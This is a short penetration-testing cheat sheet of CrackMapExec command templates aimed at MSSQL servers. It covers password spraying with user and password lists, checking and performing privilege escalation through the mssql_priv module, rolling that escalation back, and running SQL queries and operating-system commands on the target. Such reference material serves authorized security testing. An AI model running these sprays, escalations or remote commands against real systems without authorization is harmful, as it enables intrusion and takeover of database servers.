# cme

% cme-mssql, crackmapexec, windows, Active directory
#plateform/linux #target/remote #port/1433 #protocol/mssql

## mssql password spray
#cat/ATTACK/BRUTEFORCE-SPRAY  

```bash
cme mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
```

## mssql check privesc
#cat/RECON 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -M mssql_priv -o 'ACTION=enum_priv'
```

## mssql privesc
#cat/ATTACK/EXPLOIT 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -M mssql_priv -o 'ACTION=privesc'
```

## mssql clean privesc
#cat/ATTACK/EXPLOIT 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -M mssql_priv -o 'ACTION=rollback'
```

## mssql execute query
#cat/ATTACK/EXPLOIT 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## mssql execute command
#cat/ATTACK/EXPLOIT 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>
```